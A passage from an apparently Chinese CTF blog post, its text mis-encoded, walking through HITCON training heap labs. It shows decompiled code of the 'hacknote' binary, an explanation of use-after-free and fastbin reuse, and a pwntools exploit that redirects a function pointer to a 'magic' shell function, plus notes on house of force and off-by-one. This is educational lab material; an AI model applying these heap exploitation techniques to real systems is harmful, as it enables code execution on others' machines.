  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4h] [ebp-14h]</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+8h] [ebp-10h]</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-Ch]</span>

  v3 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v1 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> v1 <span class="token operator">>=</span> count <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Out of bound!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//å…ˆfreeæ‰content</span>
    <span class="token function">free</span><span class="token punctuation">(</span>notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">//å†freeè‡ªå·±</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Success"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>print_note:</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">print_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4h] [ebp-14h]</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+8h] [ebp-10h]</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-Ch]</span>

  v3 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v1 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> v1 <span class="token operator">>=</span> count <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Out of bound!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>
    <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span>__cdecl <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span>notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span>notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>è¿˜å¯ä»¥çœ‹åˆ°ä¸€ä¸ª<code>magicï¼ˆaddr = 0x08048986)</code>å‡½æ•°ï¼Œè€Œè¿™ä¸ªå‡½æ•°å°±æ˜¯æˆ‘ä»¬çš„ç›®æ ‡å“¦ï¼š</p>
<p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102205533.png" class="lazyload"></p>
<blockquote>
<p> è§£é¢˜é€»è¾‘ï¼šé€šè¿‡ä¸Šé¢å¯¹fastbinï¼Œuafçš„äº†è§£åï¼Œå¤§æ¦‚å¯ä»¥ç†è§£è¿™ä¸ªé¢˜ç›®çš„è§£é¢˜æ–¹æ³•äº†ã€‚æˆ‘ä»¬é¦–å…ˆè¦æ˜ç™½mallocå’Œfreeæœºåˆ¶ï¼Œå…ˆè¢«freeæ‰çš„å—ä¼šå¾ˆå¿«è¢«åº”ç”¨äºæ–°çš„mallocï¼Œå‰ææ˜¯å¤§å°åˆé€‚ï¼Œä¾‹å¦‚<code>free v1; v2 = malloc(4)</code>ï¼Œå¦‚æœåŸæ¥v1çš„å¤§å°ä¹Ÿä¸º4ï¼Œé‚£ä¹ˆv1åŸæ¥çš„é‚£å—å†…å­˜å°±ä¼šè¢«åˆ†é…ç»™v2ï¼Œé€šè¿‡v1å¯ä»¥ï¼ˆuafï¼‰è®¿é—®v2çš„å†…å®¹ã€‚</p>
<p>Fï¼ŒAï¼ŒUï¼ˆå…ˆFREE,å†ä¿®æ”¹chunkï¼Œè°ƒç”¨chunkä¸­çš„å‡½æ•°æŒ‡é’ˆï¼‰ã€‚è®©ä¸¤ä¸ªæŒ‡é’ˆå®é™…æŒ‡å‘åŒä¸€ä¸ªchunkï¼Œä¸€ä¸ªæŒ‡é’ˆæŠŠå†…å­˜è§£é‡Šä¸ºå­—ç¬¦ä¸²ï¼Œä»è€Œå†™å…¥ä»»æ„å€¼ï¼Œå¦ä¸€ä¸ªæŒ‡é’ˆæŠŠå†…å­˜è§£é‡Šä¸ºå‡½æ•°æŒ‡é’ˆï¼Œä»è€Œæ§åˆ¶äº†EIPã€‚</p>
</blockquote>
<h3 id="æ„é€ EXP"><a href="#æ„é€ EXP" class="headerlink" title="æ„é€ EXP"></a>æ„é€ EXP</h3><p>å€Ÿé‰´veritas501å¸ˆå‚…çš„EXPï¼Œç¨åŠ ä¿®æ”¹å’Œç†è§£ï¼š</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf8</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>

cn <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./hacknote'</span><span class="token punctuation">)</span>
bin <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./hacknote'</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#æ·»åŠ </span>
<span class="token keyword">def</span> <span class="token function">add_note</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>
    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#åˆ é™¤â€”â€”free</span>
<span class="token keyword">def</span> <span class="token function">del_note</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>
    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#æ‰“å°</span>
<span class="token keyword">def</span> <span class="token function">print_note</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>
    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#sizeéšæ„ï¼Œä¸ç­‰äº8å°±è¡Œ</span>
add_note<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token string">'aaa'</span><span class="token punctuation">)</span>
add_note<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token string">'bbb'</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#contentçš„å¤§å°ä¸ç­‰äº8ï¼ˆè¿™æ˜¯ç¨‹åºä¸­note_chunkçš„å¤§å°,note_chunkå°±æ˜¯ç¬¬ä¸€æ¬¡mallocçš„é‚£ä¸ªï¼‰ï¼Œæ˜¯ä¸ºäº†ç­‰ä¼šåˆ†é…8 bytesçš„contentä¸ä¼šè¢«åˆ†é…åˆ°ä¹‹å‰çš„contentçš„binä¸Šï¼Œè€Œæ˜¯åˆ†é…åˆ°noteçš„binä¸Šã€‚</span>

<span class="token comment" spellcheck="true">#æŒ‰ç…§mallocå’Œfreeæœºåˆ¶ï¼Œå¦‚æœæˆ‘ä»¬del_noteæ¢ä¸€ä¸‹ä½ç½®ï¼Œå…ˆdel_note(1)ï¼Œnote2_chunkä¼šè¢«æ”¾åœ¨åŸæ¥çš„note0_chunkä½ç½®ï¼Œè€Œnote3_contenté‡Œçš„magicå‡½æ•°åœ°å€å°±ä¼šè¢«æ”¾åœ¨note1_chunkä½ç½®ï¼Œåé¢çš„print_note(0)ï¼ŒåŒæ ·ä¹Ÿéœ€è¦æ”¹ä¸ºprint_note(1)ï¼Œæ‰èƒ½getshell</span>
del_note<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
del_note<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

add_note<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>p32<span class="token punctuation">(</span>bin<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'magic'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

print_note<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
cn<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>è¿è¡Œæ•ˆæœï¼š</p>
<p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102214243.png" class="lazyload"></p>
<h2 id="lab11-bamboobox"><a href="#lab11-bamboobox" class="headerlink" title="lab11-bamboobox"></a>lab11-bamboobox</h2><h3 id="hof-house-of-force"><a href="#hof-house-of-force" class="headerlink" title="hof (house of force)"></a>hof (house of force)</h3><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/house_of_force.html" target="_blank" rel="noopener">heap-exploitationâ€”â€”house of forceå‚è€ƒé“¾æ¥</a></p>
<blockquote>
<p>å¼•ç”¨m4xå¤§ä½¬åšå®¢åŸè¯ï¼š</p>
<p>ç®€å•è¯´ä¸€ä¸‹æˆ‘å¯¹ hof çš„ç†è§£ï¼Œå¦‚æœæˆ‘ä»¬èƒ½æ§åˆ¶ <strong>top_chunk</strong> çš„ <strong>size</strong>ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ§åˆ¶ malloc ä¸€äº›ç²¾å¿ƒè®¾è®¡çš„<strong>å¤§æ•°/è´Ÿæ•°</strong>æ¥å®ç°æ§åˆ¶ top_chunk çš„æŒ‡é’ˆï¼Œå°±å¯ä»¥å®ç°ä»»æ„åœ°å€å†™çš„æ•ˆæœï¼Œä¸ªäººæ„Ÿè§‰ï¼Œhof çš„æ ¸å¿ƒæ€æƒ³å°±åœ¨è¿™ä¸ª force ä¸Šï¼Œç–¯ç‹‚ mallocï¼Œç®€å•ç²—æš´æ•ˆæœæ˜æ˜¾ã€‚</p>
</blockquote>
<h3 id="off-by-oneæ¼æ´"><a href="#off-by-oneæ¼æ´" class="headerlink" title="off_by_oneæ¼æ´"></a>off_by_oneæ¼æ´</h3><blockquote>
<p><a href="https://blog.csdn.net/nibiru_holmes/article/details/62040763" target="_blank" rel="noopener">å‚è€ƒé“¾æ¥</a></p>
<p>ä¸€ä¸ªå­—èŠ‚æº¢å‡ºè¢«ç§°ä¸ºoff-by-oneï¼Œæ›¾ç»çš„ä¸€æ®µæ—¶é—´é‡Œï¼Œoff-by-oneè¢«è®¤ä¸ºæ˜¯ä¸å¯ä»¥åˆ©ç”¨çš„ï¼Œä½†æ˜¯åæ¥ç ”ç©¶å‘ç°åœ¨å †ä¸Šå“ªæ€•åªæœ‰ä¸€ä¸ªå­—èŠ‚çš„æº¢å‡ºä¹Ÿä¼šå¯¼è‡´ä»»æ„ä»£ç çš„æ‰§è¡Œã€‚</p>
</blockquote>
<blockquote>
<p>==&gt; off-by-oneæ€»å…±å¯ä»¥åˆ†ä¸ºä¸¤ç§åˆ©ç”¨æ–¹å¼:</p>
<p><strong>chunk overlapping</strong></p>
<ul>
<li><p>off-by-one overwrite allocated</p>
</li>
<li><p>off-by-one overwrite freed</p>
</li>
<li><p>off-by-one null byte</p>
</li>
</ul>
<p><strong>unlink</strong></p>
<ul>
<li><p>off-by-one small bin</p>
</li>
<li><p>off-by-one large bin</p>
</li>
</ul>
</blockquote>
<h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><p><a href="https://github.com/bash-c/slides/blob/master/pwn_heap/malloc-150821074656-lva1-app6891.pdf" target="_blank" rel="noopener">unlinkâ€”â€”pdf</a></p>
<h3 id="æ£€æŸ¥ä¿æŠ¤æªæ–½-1"><a href="#æ£€æŸ¥ä¿æŠ¤æªæ–½-1" class="headerlink" title="æ£€æŸ¥ä¿æŠ¤æªæ–½"></a>æ£€æŸ¥ä¿æŠ¤æªæ–½</h3><blockquote>
<p>checksec it!</p>
<p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102221726.png" class="lazyload"></p>
<p>å¼€å¯äº†NX,Stackï¼ŒåŒæ ·æ— æ³•é€šè¿‡å¸¸è§„æ–¹å¼æ¥æ”»å‡»ã€‚</p>
</blockquote>
<p>å¾…æ›´æ–°ã€‚ã€‚ã€‚</p>
  	
					
	  </div>     
	  

	<div class="post-footer">


  <div class="post-footer-other">
    
      <span class="post-footer-item">
        


<span class="donate-btn">
	<span class="iconfont icon-donate"></span>
</span>

<div id="donate-box" class="sildeUpMin">

	<span class="donate-cancel iconfont icon-cancel"></span>

	<div class="donate-img-box">
		<img id="donate-qr-wechat" class="noLazyLoad donate-img lazyload" src="/images/placeholder.png" alt="No Donate Image!" data-src="/images/donate1.png">	
		<img id="donate-qr-alipay" class="noLazyLoad donate-img lazyload" src="/images/placeholder.png" alt="No Donate Image!" data-src="/images/donate2.png">	
	</div>

	<span class="donate-word">ä¸è´Ÿè‡ªå·±ï¼Œä¸è´Ÿé’å¤©</span>

	<div class="donate-list">
		<span class="iconfont icon-donate-wechat"></span>
		<span class="iconfont icon-donate-alipay"></span>
	</div>

</div>
 
      </span>        
       
    
      <span class="post-footer-item">
        <span class="share-btn">
	<span class="iconfont icon-share"></span>
</span>
<div class="-mob-share sildeUpMin">
	<ul class="-mob-inner">
	   			             
        <li class="iconfont 
		icon-share-qq 
		-mob-share-qq 
		-mob-share-link"></li>		
   	   			             
        <li class="iconfont 
		icon-share-weixin 
		-mob-share-weixin 
		-mob-share-link"></li>		
   	   			             
        <li class="iconfont 
		icon-share-weibo 
		-mob-share-weibo 
		-mob-share-link"></li>		
   	   			             
        <li class="iconfont 
		icon-share-douban 
		-mob-share-douban 
		-mob-share-link"></li>		
   	   			             
        <li class="iconfont 
		icon-share-facebook 
		-mob-share-facebook 
		-mob-share-link"></li>		
   	   			             
        <li class="iconfont 
		icon-share-twitter 
		-mob-share-twitter 
		-mob-share-link"></li>		
   	   			             
        <li class="iconfont 
		icon-share-google 
		-mob-share-google 
		-mob-share-link"></li>		
   	   
	</ul>
</div>	


<script id="-mob-share" src="https://f1.webshare.mob.com/code/mob-share.js?appkey=21d601593a1de"></script>
      </span>  
               
  </div>  
    


  <div class="post-footer-meta">
        
          <i class="iconfont icon-category"></i>       
          <a class="category-link" href="/categories/CTF/">CTF</a> 	
      
        	

        
          <i class="iconfont icon-tag"></i>     
            <a class="tag-link" href="/tags/CTF/">CTF</a> <a class="tag-link" href="/tags/Pwn/">Pwn</a> <a class="tag-link" href="/tags/äºŒè¿›åˆ¶å®‰å…¨/">äºŒè¿›åˆ¶å®‰å…¨</a>    
        	
  </div>

</div>


<nav class="post-footer-nav">
  <div class="post-footer-link">
  
      <a href="/2018/11/01/devnullå’Œå¸¸ç”¨linuxå‘½ä»¤é›†/" id="post-nav-older" class="post-nav-link-wrap">
        <strong class="post-nav-caption">older</strong>
        
          <span class="post-nav-title">
            /dev/nullå’Œå¸¸ç”¨linuxå‘½ä»¤é›†
          </span>
      </a>
  
  </div>
  <div class="post-footer-link">
    
        <a href="/2018/11/03/AWD-docker/" id="post-nav-newer" class="post-nav-link-wrap">
          <strong class="post-nav-caption">newer</strong>
             
            <span class="post-nav-title">
              æ‰“é€ ä¸€ä¸ªé›†webå’Œpwnäºä¸€ä½“çš„AWD_docker
            </span>
        </a>
    
  </div>

</nav>
 
	
	
</article>

	<div class="toc-container">
			<div class="toc-sidebar">
			<p class="toc-title">
				CONTENT
			</p>
			<div class="toc-list">
				<ol class="toc-inner"><li class="toc-inner-item toc-inner-level-1"><a class="toc-inner-link" href="#Pwn-11æœˆ02-Hitcon-å…­"><span class="toc-inner-text">Pwn-11æœˆ02-Hitcon-å…­</span></a><ol class="toc-inner-child"><li class="toc-inner-item toc-inner-level-2"><a class="toc-inner-link" href="#lab10-hacknote"><span class="toc-inner-text">lab10-hacknote</span></a><ol class="toc-inner-child"><li class="toc-inner-item toc-inner-level-3"><a class="toc-inner-link" href="#UAF-use-after-free"><span class="toc-inner-text">UAF (use after free)</span></a></li><li class="toc-inner-item toc-inner-level-3"><a class="toc-inner-link" href="#fastbin"><span class="toc-inner-text">fastbin</span></a></li><li class="toc-inner-item toc-inner-level-3"><a class="toc-inner-link" href="#æ£€æŸ¥ä¿æŠ¤æªæ–½"><span class="toc-inner-text">æ£€æŸ¥ä¿æŠ¤æªæ–½</span></a></li><li class="toc-inner-item toc-inner-level-3"><a class="toc-inner-link" href="#é€»è¾‘åˆ†æ"><span class="toc-inner-text">é€»è¾‘åˆ†æ</span></a></li><li class="toc-inner-item toc-inner-level-3"><a class="toc-inner-link" href="#æ„é€ EXP"><span class="toc-inner-text">æ„é€ EXP</span></a></li></ol></li><li class="toc-inner-item toc-inner-level-2"><a class="toc-inner-link" href="#lab11-bamboobox"><span class="toc-inner-text">lab11-bamboobox</span></a><ol class="toc-inner-child"><li class="toc-inner-item toc-inner-level-3"><a class="toc-inner-link" href="#hof-house-of-force"><span class="toc-inner-text">hof (house of force)</span></a></li><li class="toc-inner-item toc-inner-level-3"><a class="toc-inner-link" href="#off-by-oneæ¼æ´"><span class="toc-inner-text">off_by_oneæ¼æ´</span></a></li><li class="toc-inner-item toc-inner-level-3"><a class="toc-inner-link" href="#unlink"><span class="toc-inner-text">unlink</span></a></li><li class="toc-inner-item toc-inner-level-3"><a class="toc-inner-link" href="#æ£€æŸ¥ä¿æŠ¤æªæ–½-1"><span class="toc-inner-text">æ£€æŸ¥ä¿æŠ¤æªæ–½</span></a></li></ol></li></ol></li></ol>
			</div>
		</div>
	</div>

          </div> 
      </div>            
    
    <a id="page-backTop">
      <span>
        <i class="iconfont icon-backtotop"></i>
      </span>
    </a> 

  
    
    <div class="search-container sildeUpMin">
        <div class="search-header">
            <input type="text" placeholder="è¾“å…¥ä½ æƒ³æœç´¢çš„" id="search-input" class="search-input">
            <span class="search-cancel">
                <i class="iconfont icon-cancel">
            </i></span>
        </div>
        <div id="search-result" class="search-result"></div>
    </div>
 
     <div class="mobile-menu">      

      
      <img class="mobile-menu-icon lazyload" src="/images/placeholder.png" data-src="/images/favicon.png">  
      

         
            

            <a class="mobile-menu-link" href="/">é¦–é¡µ
            </a>
            
         
            

            <a class="mobile-menu-link" href="/archives">å½’æ¡£
            </a>
            
         
            

            <a class="mobile-menu-link" href="/tags">æ ‡ç­¾
            </a>
            
         
            

            <a class="mobile-menu-link" href="/about">å…³äº
            </a>
            
         
                          

            <a class="mobile-menu-link mobile-menu-search" href="#">æœç´¢ </a>                 
            
         
      
</div>
        
    



     
    




<footer id="footer">	    

		
		<div class="footer-copyright">
		&copy;
				
		2018-
		
		2019		
	
		xiaoyifeng
		<br>

		Theme  <a href="https://github.com/Lemonreds/hexo-theme-Nayo" target="_blank">Nayo</a>
		</div>			
	 
</footer>   

    <script src="/nayo.bundle.js"></script>           
  <script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":80,"height":170},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>        
</html>